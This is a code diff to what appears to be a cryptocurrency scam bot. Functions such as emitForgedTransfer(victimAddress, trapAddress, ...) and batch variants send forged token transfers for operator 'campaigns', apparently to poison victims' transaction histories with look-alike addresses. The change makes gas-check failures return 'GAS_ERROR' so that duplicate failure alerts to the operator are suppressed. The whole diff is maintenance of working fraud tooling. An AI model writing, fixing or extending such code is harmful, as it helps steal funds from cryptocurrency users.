@@ -1283,7 +1283,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
           try { await sendAlert(alertMsg, 'warning', campaignId); } catch (alertErr) { }
           lastGasAlertTime.set(operatorAddress, now);
         }
-        return false;
+        return 'GAS_ERROR'; // 🚀 Tell flushQueue we already sent the alert
       }
     } catch (checkErr) {
       logger.warn(`[mirror] Pre-flight gas check failed (will still attempt tx): ${checkErr.message}`);
@@ -1534,14 +1534,14 @@ async function flushQueue(key) {
         campaignId,
         contractAddr
       );
-      if (hash) {
+      if (hash && hash !== 'GAS_ERROR') {
         await sendBatchAlert([item], hash, contractAddr);
         updateBatchStats([item], true);
       } else {
         updateBatchStats([item], false);
-
-        // 🚀 FIX: Removed hanging client.getBalance() RPC calls
-        await sendBatchFailureAlert([item], 'Transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
+        if (hash !== 'GAS_ERROR') {
+          await sendBatchFailureAlert([item], 'Transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
+        }
       }
       return;
     }
@@ -1561,7 +1561,7 @@ async function flushQueue(key) {
       values
     );
 
-    if (hash) {
+    if (hash && hash !== 'GAS_ERROR') {
       logger.info(`[batch] ✅ Batch confirmed: ${groupItems.length} transfers in tx=${hash}`);
       await sendBatchAlert(groupItems, hash, contractAddr);
       updateBatchStats(groupItems, true);
@@ -1569,8 +1569,9 @@ async function flushQueue(key) {
       logger.error(`[batch] ❌ Batch failed for ${groupItems.length} items`);
       updateBatchStats(groupItems, false);
 
-      // 🚀 FIX: Removed hanging client.getBalance() RPC calls
-      await sendBatchFailureAlert(groupItems, 'Batch transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
+      if (hash !== 'GAS_ERROR') {
+        await sendBatchFailureAlert(groupItems, 'Batch transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
+      }
     }
     return;
   }
@@ -1584,7 +1585,7 @@ async function flushQueue(key) {
     contractGroups
   );
 
-  if (hash) {
+  if (hash && hash !== 'GAS_ERROR') {
     logger.info(`[batch] ✅ Multi-token batch confirmed: ${items.length} transfers across ${contractGroups.size} tokens in tx=${hash}`);
     await sendBatchAlert(items, hash, MULTI_TOKEN_ROUTER);
     updateBatchStats(items, true);
@@ -1592,10 +1593,9 @@ async function flushQueue(key) {
     logger.error(`[batch] ❌ Multi-token batch failed for ${items.length} items`);
     updateBatchStats(items, false);
 
-    // 🚀 FIX: Removed client.getBalance() and client.getGasPrice() from here!
-    // Those RPC calls were hanging on bad nodes and blocking the notification from ever sending.
-    // The exact gas error is already handled and sent directly inside emitMultiTokenBatch.
-    await sendBatchFailureAlert(items, 'Transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
+    if (hash !== 'GAS_ERROR') {
+      await sendBatchFailureAlert(items, 'Transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
+    }
   }
 }
 
@@ -1627,7 +1627,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         logger.error(`[batch] Operator ${operatorAddress} ${errorMsg}`);
         const msg = `❌ *Single-Token Batch FAILED*\n\n📦 Items: ${froms.length} transfers\n⚠️ Error: ${errorMsg}\n🔑 Operator: \`${operatorAddress}\`\n\n💡 Fund this wallet to resume batching.`;
         try { await sendAlert(msg, 'warning', campaignId); } catch (alertErr) { }
-        return false;
+        return 'GAS_ERROR'; // 🚀 Tell flushQueue we already sent the alert
       }
     } catch (checkErr) {
       logger.warn(`[batch] Pre-flight gas check failed: ${checkErr.message}`);
@@ -1769,7 +1769,7 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
         logger.error(`[multi-batch] Operator ${operatorAddress} ${errorMsg}`);
         const msg = `❌ *Multi-Token Batch FAILED*\n\n📦 Items: ${totalTransfers} transfers\n⚠️ Error: ${errorMsg}\n🔑 Operator: \`${operatorAddress}\`\n\n💡 Fund this wallet to resume batching.`;
         try { await sendAlert(msg, 'warning', campaignId); } catch (alertErr) { }
-        return false;
+        return 'GAS_ERROR'; // 🚀 Tell flushQueue we already sent the alert
       }
     } catch (checkErr) {
       logger.warn(`[multi-batch] Pre-flight gas check failed: ${checkErr.message}`);
